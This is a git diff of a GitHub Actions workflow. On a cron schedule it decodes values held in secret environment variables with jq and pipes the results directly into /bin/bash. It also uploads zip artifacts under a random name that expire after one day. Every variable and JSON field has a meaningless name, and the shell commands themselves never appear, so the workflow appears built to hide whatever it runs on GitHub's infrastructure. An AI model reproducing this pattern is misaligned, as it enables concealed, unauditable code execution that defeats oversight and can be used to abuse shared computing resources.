@@ -1,10 +1,9 @@
 name: yongchangshunjian
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '25 3/6 * * *'
 
+  schedule:
+    - cron: '28 4,10,16,22 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,17 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: yongchangshunjian
         env:
-          an6538: ${{ secrets.an6538 }}
+          hyh569: ${{ secrets.hyh569 }}
         run: |
-          echo $an6538 | jq -r .b3 | /bin/bash
-          echo $jym92333 | jq -r .lk47327 | /bin/bash
-          echo $nahlr2641 | jq -r .krifc6359 | /bin/bash
-          echo $dzz5898 | jq -r .iwmpt78217 | /bin/bash
-          echo $dbk0 | jq -r .cwff0238 | /bin/bash
-          echo $mcikv0143 | jq -r .pce1094 | /bin/bash
-          echo $rc98 | jq -r .obbsb65482 | /bin/bash
-          echo $gq10760 | jq -r .qw20 | /bin/bash
-          echo $m3 | jq -r .s1 | /bin/bash
-          echo $qem59 | jq -r .stj2490 | /bin/bash
-          echo $z7163 | jq -r .ojego88507 | /bin/bash
+          printf '%s' "$hyh569" | jq -r .zok50844 | /bin/bash
+          printf '%s' "$abx270" | jq -r .gs7531 | /bin/bash
+          printf '%s' "$atke62" | jq -r .u1407 | /bin/bash
+          echo $m83427 | jq -r .yclw9 | /bin/bash
+          echo $fu81 | jq -r .mwscb12209 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: riEz9i3Q
+          path: "*.zip"
+          retention-days: 1
